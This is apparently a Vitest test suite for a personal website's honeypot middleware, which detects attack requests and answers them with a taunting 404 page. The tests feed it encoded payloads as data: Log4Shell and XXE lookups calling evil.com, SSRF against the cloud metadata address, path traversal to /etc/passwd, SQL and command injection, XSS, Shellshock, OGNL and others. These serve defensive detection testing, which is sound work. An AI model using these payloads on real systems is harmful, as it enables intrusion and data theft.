// proxy.ts is Edge Middleware with no exports besides `proxy` itself and
// `config` -- every attack signature, taunt pool, and helper function is
// module-private. Rather than export internals just to make them testable
// (more API surface for no real benefit), these tests drive `proxy()`
// exactly the way a real request would: construct a NextRequest, call
// proxy(), assert on the NextResponse. This is the same black-box approach
// used to manually verify every attack category via curl this session --
// these tests just make that verification permanent and automatic instead
// of a one-time check that bit-rots the moment the file changes again.
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { NextRequest } from "next/server";
import { proxy } from "./proxy";

// Supabase env vars are intentionally unset for most of these tests (as
// they are in CI, and as a fresh `npm test` run has them unless something
// exports them into the shell) -- every DB-backed check in proxy.ts
// (isTrustedIp, checkFloodPattern, getSuspiciousHitCount, logHoneypotHit)
// already treats "not configured" as its own valid state and short-circuits
// without a network call, so the bulk of this suite runs with zero mocking
// and zero live requests. A handful of tests below explicitly opt into
// configured-with-mocked-fetch to cover the trust/flood/escalation paths.
beforeEach(() => {
  vi.unstubAllEnvs();
  vi.stubEnv("NEXT_PUBLIC_SUPABASE_URL", "");
  vi.stubEnv("SUPABASE_SERVICE_ROLE_KEY", "");
});

afterEach(() => {
  vi.restoreAllMocks();
  vi.unstubAllEnvs();
});

function request(path: string, init?: { headers?: Record<string, string> }): NextRequest {
  return new NextRequest(`https://oliverstraus.com${path}`, { headers: init?.headers });
}

async function bodyText(res: Response): Promise<string> {
  return res.text();
}

describe("random/legitimate traffic is never intercepted", () => {
  it("passes through a random path with no signature", async () => {
    const res = await proxy(request("/totally-made-up-path-xyz-123"));
    expect(res.status).not.toBe(404);
    // No honeypot markup on the pass-through response.
    expect(res.headers.get("content-type") ?? "").not.toContain("text/html; charset=utf-8");
  });

  it("passes through a real page with an ordinary query string", async () => {
    const res = await proxy(request("/work?utm_source=twitter&utm_campaign=fall"));
    expect(res.status).not.toBe(404);
  });

  it("sets a Content-Security-Policy header on pass-through responses", async () => {
    const res = await proxy(request("/"));
    expect(res.headers.get("content-security-policy")).toContain("default-src 'self'");
  });
});

describe("honeypot decoy paths", () => {
  it("returns a 404 with the terminal-styled response for an exact decoy path", async () => {
    const res = await proxy(request("/wp-config.php.bak"));
    expect(res.status).toBe(404);
    expect(res.headers.get("content-type")).toContain("text/html");
    const body = await bodyText(res);
    expect(body).toContain('class="term"');
    expect(body).toContain("GET /wp-config.php.bak");
  });

  it("does not intercept a path that merely resembles a decoy", async () => {
    // Not an exact match against HONEYPOT_PATHS -- must not trigger.
    const res = await proxy(request("/wp-config.php.bak.old"));
    expect(res.status).not.toBe(404);
  });

  it("renders the query string as inert percent-encoded text, not decoded markup", async () => {
    // The displayed "$ GET ..." line echoes request.nextUrl.search verbatim
    // (never decoded), so a script payload arrives and stays percent-encoded
    // -- there's no literal "<script>" for a browser to ever parse as a tag.
    const res = await proxy(request("/wp-config.php.bak?x=%3Cscript%3Ealert(1)%3C%2Fscript%3E"));
    const body = await bodyText(res);
    expect(body).not.toContain("<script>alert(1)</script>");
    expect(body).toContain("%3Cscript%3E");
  });

  it("escapes an attacker-controlled IP (X-Forwarded-For) before rendering it", async () => {
    // Unlike the path, the IP shown in the magic-trick reveal is genuinely
    // attacker-controlled free text with no encoding constraint -- this is
    // the surface escapeHtml() actually exists to protect.
    const res = await proxy(
      request("/wp-config.php.bak", { headers: { "x-forwarded-for": "<script>alert(1)</script>" } }),
    );
    const body = await bodyText(res);
    expect(body).not.toContain("<script>alert(1)</script>");
    expect(body).toContain("&lt;script&gt;");
  });
});

// Every category from src/proxy.ts's ATTACK_SIGNATURES, driven through the
// exact same payload shapes verified manually via curl this session. Each
// assertion checks for the category's tag in the rendered response, which
// only appears when detectAttack() returns that specific signature.
describe("attack signature detection", () => {
  const cases: { name: string; path: string; tag: string }[] = [
    { name: "log4shell", path: "/?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fa%7D", tag: "LOG4SHELL" },
    { name: "sqli", path: "/?id=1%27+OR+%271%27%3D%271", tag: "SQL INJECTION" },
    { name: "xss", path: "/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E", tag: "XSS" },
    { name: "path traversal", path: "/?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd", tag: "PATH TRAVERSAL" },
    // Deliberately avoids /etc/passwd here -- that substring alone would
    // also match path_traversal, which is earlier in ATTACK_SIGNATURES and
    // would win first, masking this category's own detection.
    { name: "command injection", path: "/?cmd=%3B+whoami+now", tag: "COMMAND INJECTION" },
    { name: "ssrf", path: "/?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F", tag: "SSRF" },
    { name: "nosql injection", path: "/?filter=%7B%22%24where%22%3A%221%22%7D", tag: "NOSQL INJECTION" },
    { name: "template injection", path: "/?name=%7B%7B7*7%7D%7D", tag: "TEMPLATE INJECTION (SSTI)" },
    { name: "deserialization", path: "/?data=rO0ABXNyAA", tag: "INSECURE DESERIALIZATION" },
    { name: "crlf injection", path: "/?x=%0d%0aSet-Cookie%3Aevil%3D1", tag: "CRLF INJECTION" },
    {
      name: "file inclusion",
      path: "/?file=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex",
      tag: "FILE INCLUSION (LFI/RFI)",
    },
    { name: "prototype pollution", path: "/?__proto__%5Bx%5D=1", tag: "PROTOTYPE POLLUTION" },
    { name: "graphql probe", path: "/?query=__schema%7Btypes%7Bname%7D%7D", tag: "GRAPHQL INTROSPECTION PROBE" },
    { name: "open redirect", path: "/?redirect=http%3A%2F%2Fevil.com", tag: "OPEN REDIRECT ATTEMPT" },
    { name: "xxe", path: "/?x=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22http%3A%2F%2Fevil.com%2Fx%22%3E%5D%3E", tag: "XXE" },
    {
      name: "struts2 ognl",
      path: "/?x=%25%7B%28%23_%3D%27multipart%2Fform-data%27%29.%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29%7D",
      tag: "STRUTS2 OGNL INJECTION",
    },
    {
      name: "spring4shell",
      path: "/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=x",
      tag: "SPRING4SHELL",
    },
    { name: "ldap injection", path: "/?u=*)(uid=*", tag: "LDAP INJECTION" },
    { name: "xpath injection", path: "/?x=%27+or+%27%27%3D%27%27", tag: "XPATH INJECTION" },
    { name: "ssi injection", path: "/?x=%3C%21--%23exec+cmd%3D%22ls%22--%3E", tag: "SSI INJECTION" },
    { name: "php-cgi argument injection", path: "/?x=allow_url_include%3D1", tag: "PHP-CGI ARGUMENT INJECTION" },
    { name: "jwt alg:none", path: "/?token=eyJhbGciOiJub25lIn0", tag: "JWT ALG:NONE" },
  ];

  for (const { name, path, tag } of cases) {
    it(`detects ${name} and tags the response`, async () => {
      const res = await proxy(request(path));
      expect(res.status).toBe(404);
      const body = await bodyText(res);
      expect(body).toContain(`[${tag}]`);
    });
  }

  it("detects a known scanner tool by User-Agent", async () => {
    const res = await proxy(request("/", { headers: { "user-agent": "sqlmap/1.7.2#stable" } }));
    expect(res.status).toBe(404);
    expect(await bodyText(res)).toContain("[KNOWN SCANNER TOOL]");
  });

  it("detects Shellshock by User-Agent", async () => {
    const res = await proxy(request("/", { headers: { "user-agent": "() { :; }; echo vulnerable" } }));
    expect(res.status).toBe(404);
    expect(await bodyText(res)).toContain("[SHELLSHOCK]");
  });

  it("detects an attack signature carried in the Referer header", async () => {
    const res = await proxy(
      request("/", { headers: { referer: "http://evil.com/?id=1' OR '1'='1" } }),
    );
    expect(res.status).toBe(404);
    expect(await bodyText(res)).toContain("[SQL INJECTION]");
  });

  it("detects a mismatched Host header", async () => {
    const res = await proxy(request("/", { headers: { host: "evil-attacker.example" } }));
    expect(res.status).toBe(404);
    expect(await bodyText(res)).toContain("[HOST HEADER INJECTION]");
  });

  it("does not flag the real production Host", async () => {
    const res = await proxy(request("/", { headers: { host: "oliverstraus.com" } }));
    expect(res.status).not.toBe(404);
  });

  it("does not flag a Vercel preview Host", async () => {
    const res = await proxy(request("/", { headers: { host: "oliverstraus-abc123.vercel.app" } }));
    expect(res.status).not.toBe(404);
  });
});

describe("evasion resistance", () => {
  it("catches a double-encoded payload (decodeForScanning decodes up to 3 times)", async () => {
    // "${jndi:" percent-encoded twice over: %2524%257Bjndi%253A -> %24%7Bjndi%3A -> ${jndi:
    const res = await proxy(request("/?q=%2524%257Bjndi%253Aldap%253A%252F%252Fevil.com%252Fa%257D"));
    expect(res.status).toBe(404);
    expect(await bodyText(res)).toContain("[LOG4SHELL]");
  });

  it("normalizes '+' to a space in the query portion before matching", async () => {
    // Without the "+"-to-space fix, "1'+OR+'1'='1" never matched \s* in the
    // SQLi pattern -- this is the exact bug found and fixed this session.
    const res = await proxy(request("/?id=1%27+OR+%271%27%3D%271"));
    expect(res.status).toBe(404);
    expect(await bodyText(res)).toContain("[SQL INJECTION]");
  });
});

describe("scope exclusions", () => {
  it("does not scan query strings on /admin/* routes (redirects to login instead)", async () => {
    const res = await proxy(request("/admin/stats?q=1' OR '1'='1"));
    // No session cookie -> proxyAdmin redirects to /admin/login. Whatever
    // happens, it must not be this file's honeypot response.
    const body = await bodyText(res);
    expect(body).not.toContain('class="term"');
  });

  it("does not scan query strings on /api/* routes", async () => {
    const res = await proxy(request("/api/contact?q=<script>alert(1)</script>"));
    const body = await bodyText(res);
    expect(body).not.toContain('class="term"');
  });
});

describe("the magic-trick reveal", () => {
  it("reflects the requester's own IP, escaped", async () => {
    const res = await proxy(
      request("/wp-config.php.bak", { headers: { "x-forwarded-for": "203.0.113.42" } }),
    );
    const body = await bodyText(res);
    expect(body).toContain("203.0.113.42");
    expect(body).toContain("want to see a magic trick");
  });

  it("shows a graceful placeholder when the IP can't be determined", async () => {
    const res = await proxy(request("/wp-config.php.bak"));
    const body = await bodyText(res);
    expect(body).not.toContain("undefined");
    expect(body).not.toContain("null");
  });
});

describe("DB-backed behavior with Supabase configured", () => {
  const SUPABASE_URL = "https://test.supabase.co";

  beforeEach(() => {
    vi.stubEnv("NEXT_PUBLIC_SUPABASE_URL", SUPABASE_URL);
    vi.stubEnv("SUPABASE_SERVICE_ROLE_KEY", "test-service-role-key");
  });

  function mockFetch(opts: { trusted?: boolean; suspiciousCount?: number }) {
    const trusted = opts.trusted ?? false;
    const suspiciousCount = opts.suspiciousCount ?? 0;
    vi.stubGlobal(
      "fetch",
      vi.fn(async (input: string | URL | Request, init?: RequestInit) => {
        const url = typeof input === "string" ? input : input.toString();
        const method = init?.method ?? "GET";

        if (url.includes("/admin_auth_attempts") && method === "GET") {
          return new Response(JSON.stringify(trusted ? [{ id: "1" }] : []), { status: 200 });
        }
        if (url.includes("/honeypot_hits") && method === "HEAD") {
          return new Response(null, {
            status: 200,
            headers: { "content-range": `0-0/${suspiciousCount}` },
          });
        }
        if (url.includes("/honeypot_hits") && method === "POST") {
          return new Response(null, { status: 201 });
        }
        if (url.includes("/blocked_ips") && method === "POST") {
          return new Response(null, { status: 201 });
        }
        return new Response(null, { status: 200 });
      }),
    );
  }

  it("still shows the taunt for a honeypot hit but skips auto-block for a trusted source", async () => {
    mockFetch({ trusted: true });
    const fetchSpy = vi.mocked(global.fetch);
    const res = await proxy(request("/wp-config.php.bak", { headers: { "x-forwarded-for": "37.19.210.16" } }));
    expect(res.status).toBe(404); // honeypot paths always intercept, trusted or not
    // No POST to blocked_ips should have happened for a trusted source.
    const blockPosts = fetchSpy.mock.calls.filter(([u, init]) => {
      const url = typeof u === "string" ? u : u.toString();
      return url.includes("/blocked_ips") && (init as RequestInit | undefined)?.method === "POST";
    });
    expect(blockPosts.length).toBe(0);
  });

  it("lets a trusted source through untouched on a real page even with an attack payload", async () => {
    mockFetch({ trusted: true });
    const res = await proxy(
      request("/?id=1' OR '1'='1", { headers: { "x-forwarded-for": "37.19.210.16" } }),
    );
    expect(res.status).not.toBe(404);
  });

  it("blocks an untrusted source that hits a honeypot path", async () => {
    mockFetch({ trusted: false });
    const fetchSpy = vi.mocked(global.fetch);
    await proxy(request("/wp-config.php.bak", { headers: { "x-forwarded-for": "203.0.113.99" } }));
    const blockPosts = fetchSpy.mock.calls.filter(([u, init]) => {
      const url = typeof u === "string" ? u : u.toString();
      return url.includes("/blocked_ips") && (init as RequestInit | undefined)?.method === "POST";
    });
    expect(blockPosts.length).toBe(1);
  });

  it("shows the DDoS taunt when the flood threshold is met", async () => {
    mockFetch({ trusted: false, suspiciousCount: 5 });
    const res = await proxy(request("/wp-config.php.bak", { headers: { "x-forwarded-for": "203.0.113.10" } }));
    const body = await bodyText(res);
    expect(body).toContain("[FLOOD / DOS PATTERN]");
  });

  it("does not show the DDoS taunt below the flood threshold", async () => {
    mockFetch({ trusted: false, suspiciousCount: 4 });
    const res = await proxy(request("/wp-config.php.bak", { headers: { "x-forwarded-for": "203.0.113.11" } }));
    const body = await bodyText(res);
    expect(body).not.toContain("[FLOOD / DOS PATTERN]");
  });

  it("escalates to the Cyber Crimes Division reveal at the repeat-offender threshold", async () => {
    mockFetch({ trusted: false, suspiciousCount: 5 });
    const res = await proxy(request("/wp-config.php.bak", { headers: { "x-forwarded-for": "203.0.113.12" } }));
    const body = await bodyText(res);
    expect(body).toContain("Cyber Crimes Division");
    expect(body).toContain("JK. None of your attacks were ever going to work here anyway.");
  });

  it("shows the plain IP reveal below the repeat-offender threshold", async () => {
    mockFetch({ trusted: false, suspiciousCount: 2 });
    const res = await proxy(request("/wp-config.php.bak", { headers: { "x-forwarded-for": "203.0.113.13" } }));
    const body = await bodyText(res);
    expect(body).not.toContain("Cyber Crimes Division");
    expect(body).toContain("Ta-da");
  });
});
